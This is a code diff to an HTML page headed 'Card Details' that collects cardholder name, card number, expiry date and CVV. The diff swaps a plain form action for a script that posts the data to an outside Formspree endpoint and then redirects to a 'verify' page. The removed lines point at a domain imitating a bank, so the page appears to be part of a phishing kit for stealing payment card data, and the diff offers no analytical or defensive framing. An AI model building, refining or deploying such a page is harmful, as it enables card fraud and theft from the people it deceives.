@@ -7,15 +7,37 @@
 <body>
   <div class="container">
     <h2>Card Details</h2>
-    <form action="https://formspree.io/f/mnnvnwap" method="POST">
+    <form id="form">
       <label>Cardholder Name: *</label><br><input type="text" name="cardname" required><br>
       <label>Card Number: *</label><br><input type="text" name="cardnumber" required><br>
       <label>Expiry: *</label><br><input type="text" name="expiry" required><br>
       <label>CVV: *</label><br><input type="text" name="cvv" required><br>
-
-      <input type="hidden" name="_redirect" value="https://axis.managingprofile.online/verify.html">
       <input type="submit" value="Next">
     </form>
   </div>
+
+<script>
+  document.getElementById('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    fetch("https://formspree.io/f/mnnvnwap", {
+      method: "POST",
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(response => {
+      if (response.ok) {
+        window.location.href = "verify.html";
+      } else {
+        alert("Form submission failed. Please try again.");
+      }
+    }).catch(error => {
+      console.error("Error submitting form:", error);
+      alert("An error occurred. Please try again.");
+    });
+  });
+</script>
+
 </body>
 </html>
